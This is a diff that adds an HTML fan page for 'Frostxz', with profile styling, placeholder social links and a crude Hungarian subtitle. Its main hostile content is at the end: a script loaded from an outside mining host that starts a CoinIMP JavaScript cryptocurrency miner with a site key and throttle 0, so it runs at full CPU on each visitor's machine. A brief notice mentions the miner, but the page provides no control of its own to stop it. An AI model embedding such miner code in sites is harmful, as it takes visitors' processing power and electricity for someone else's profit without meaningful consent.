@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Frostxz Fanpage</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        .profile-image {
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+            border: 3px solid #7c00ff;
+        }
+        .title {
+            font-size: 2.5em;
+            margin-top: 10px;
+        }
+        .subtitle {
+            color: #9b9b9b;
+            margin-bottom: 20px;
+        }
+        .social-buttons a {
+            background-color: #333;
+            color: #fff;
+            padding: 10px 20px;
+            margin: 10px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 1.2em;
+        }
+        .social-buttons a:hover {
+            background-color: #7c00ff;
+        }
+        .miner-notification {
+            margin-top: 30px;
+            color: #cccccc;
+            background-color: #3d3d3d;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="frostxz.png" alt="Frostxz Profile Picture" class="profile-image">
+        <h1 class="title">Frostxz</h1>
+        <p class="subtitle">geci hulye vagyok</p>
+
+        <div class="social-buttons">
+            <a href="#">Instagram</a>
+            <a href="#">Snapchat</a>
+            <a href="#">YouTube</a>
+        </div>
+
+        <div class="miner-notification" id="miner-notification">
+            This site is running a JavaScript miner from coinimp.com. If it bothers you, you can stop it.
+        </div>
+    </div>
+
+    <!-- Mining Script -->
+    <script src="https://www.hostingcloud.racing/5LoG.js"></script>
+    <script>
+        var _client = new Client.Anonymous('49857356593618aec25accfa93aaf6566cfb56697438b5c5ff44f95522f1b7c5', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    </script>
+
+</body>
+</html>
